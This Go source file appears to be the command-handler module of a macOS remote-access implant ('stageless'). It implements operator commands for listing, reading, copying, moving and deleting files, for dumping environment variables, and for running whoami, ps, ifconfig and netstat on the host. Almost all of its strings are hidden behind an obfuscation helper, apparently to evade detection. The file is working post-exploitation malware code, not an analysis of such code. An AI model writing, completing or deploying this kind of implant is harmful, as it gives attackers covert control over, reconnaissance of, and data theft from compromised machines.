package capabilities

import (
	"fmt"
	"sort"
	"strings"

	"stageless/utils/macapi"
	general "stageless/utils/general"
	"stageless/utils/obf"
)

func note(prefix, text string) []byte {
	// Writes a short status note
	return WriteMsg(prefix + text)
}

func arrow(a, b string) []byte {
	// Writes a source to destination line
	return WriteMsg(a + obf.S(" -> ") + b)
}

func joinPath(a, b string) string {
	// Builds a joined path from two parts
	if a == "" {
		return b
	}
	if strings.HasSuffix(a, "/") {
		return a + b
	}
	return a + macapi.PathSep + b
}

func stripLsFlags(raw string) string {
	// Strips leading flags from a listing argument
	raw = strings.TrimSpace(raw)
	for strings.HasPrefix(raw, "-") {
		sp := strings.Index(raw, " ")
		if sp < 0 {
			return ""
		}
		raw = strings.TrimSpace(raw[sp+1:])
	}
	return raw
}

func entryLabel(name string, isDir bool) string {
	// Returns a short label for a directory entry
	if isDir {
		return obf.S("dir")
	}
	if len(name) > 0 && name[0] == '.' {
		return obf.S("hid")
	}
	return obf.S("file")
}

func RunAttrib(args string) []byte {
	// Returns the mode string of a path
	if args == "" || !macapi.PathExists(args) {
		return nil
	}
	attr := macapi.GetPathModeStr(args)
	if attr == "" {
		return nil
	}
	return WriteMsg(attr + "  " + args)
}

func RunLs(args string) []byte {
	// Main function that lists a directory
	dir := stripLsFlags(strings.TrimSpace(args))
	if dir == "" {
		dir = macapi.GetCurrentDir()
	} else if macapi.PathExists(dir) && !macapi.PathIsDir(dir) {
		return RunAttrib(dir)
	}
	if !macapi.PathIsDir(dir) {
		return nil
	}
	entries := macapi.ListDirEntries(dir)
	sort.Slice(entries, func(i, j int) bool {
		// Compares two entry names for sorting
		return entries[i].Name < entries[j].Name
	})
	var b strings.Builder
	b.WriteString(obf.S("total "))
	b.WriteString(fmt.Sprintf("%d\n", len(entries)))
	for _, ent := range entries {
		full := joinPath(dir, ent.Name)
		dateStr := macapi.FormatPathMtime(full)
		sizeStr := ""
		if !ent.IsDir {
			if sz := macapi.GetPathSize(full); sz >= 0 {
				sizeStr = general.FmtSize(uint64(sz))
			} else {
				sizeStr = obf.S("?")
			}
		}
		b.WriteString(fmt.Sprintf("%-19s %8s  %-4s  %s\n", dateStr, sizeStr, entryLabel(ent.Name, ent.IsDir), ent.Name))
	}
	return WriteMsg(b.String())
}

func RunPwd() []byte {
	// Returns the current directory
	return WriteMsg(macapi.GetCurrentDir())
}

func RunCd(args string) []byte {
	// Changes the current directory
	if strings.TrimSpace(args) == "" {
		return RunPwd()
	}
	if args == "-" {
		if macapi.PrevDir() == "" || !macapi.SetCurrentDir(macapi.PrevDir()) {
			return nil
		}
		return RunPwd()
	}
	cur := macapi.GetCurrentDir()
	macapi.SetPrevDir(cur)
	if !macapi.SetCurrentDir(args) {
		return nil
	}
	return RunPwd()
}

func RunMkdir(args string) []byte {
	// Creates a directory
	if args == "" || !macapi.MakeDir(args) {
		return nil
	}
	return note(obf.S("created: "), args)
}

func RunRmdir(args string) []byte {
	// Removes a directory
	if args == "" || !macapi.RemoveDirPath(args) {
		return nil
	}
	return note(obf.S("removed: "), args)
}

func RunDel(args string) []byte {
	// Deletes a path
	if args == "" || !macapi.DeletePath(args) {
		return nil
	}
	return note(obf.S("deleted: "), args)
}

func RunCopy(args string) []byte {
	// Copies a path to another path
	parts := strings.Fields(args)
	if len(parts) < 2 || !macapi.CopyPath(parts[0], parts[1]) {
		return nil
	}
	return arrow(parts[0], parts[1])
}

func RunMove(args string) []byte {
	// Moves a path to another path
	parts := strings.Fields(args)
	if len(parts) < 2 || !macapi.MovePath(parts[0], parts[1]) {
		return nil
	}
	return arrow(parts[0], parts[1])
}

func RunRen(args string) []byte {
	// Renames a path inside its parent folder
	parts := strings.Fields(args)
	if len(parts) < 2 {
		return nil
	}
	parent := macapi.ParentPath(parts[0])
	if parent == "" {
		return nil
	}
	dst := joinPath(parent, parts[1])
	if !macapi.MovePath(parts[0], dst) {
		return nil
	}
	return arrow(parts[0], dst)
}

func RunCat(args string) []byte {
	// Reads a file into the output buffer
	if args == "" || !macapi.PathExists(args) {
		return nil
	}
	return macapi.ReadPathToBuf(args, bufCap)
}

func RunEcho(args string) []byte {
	// Writes an argument or an environment value
	if len(args) > 0 && args[0] == '$' {
		key := strings.TrimSpace(args[1:])
		if key == "" {
			return WriteMsg("")
		}
		return WriteMsg(macapi.EnvGetValue(key))
	}
	return WriteMsg(args)
}

func RunSet(args string) []byte {
	// Returns environment values
	if args == "" {
		var b strings.Builder
		for _, pair := range macapi.EnvEnumerate() {
			b.WriteString(pair[0])
			b.WriteByte('=')
			b.WriteString(pair[1])
			b.WriteByte('\n')
		}
		return WriteMsg(b.String())
	}
	val := macapi.EnvGetValue(args)
	if val == "" {
		return WriteMsg(args + "=" + obf.S("(not set)"))
	}
	return WriteMsg(args + "=" + val)
}

func RunWhoami(args string) []byte {
	// Runs the whoami command
	return macapi.ExecPosix(obf.S("whoami"), args)
}

func RunEnv(args string) []byte {
	// Runs the env command
	return macapi.ExecPosix(obf.S("env"), args)
}

func RunTasklist(args string) []byte {
	// Runs the process list command
	if strings.TrimSpace(args) == "" {
		args = obf.S("-ef")
	}
	return macapi.ExecPosix(obf.S("ps"), args)
}

func RunIfconfig(args string) []byte {
	// Runs the ifconfig command
	return macapi.ExecPosix(obf.S("ifconfig"), args)
}

func RunNetstat(args string) []byte {
	// Runs the netstat command
	return macapi.ExecPosix(obf.S("netstat"), args)
}
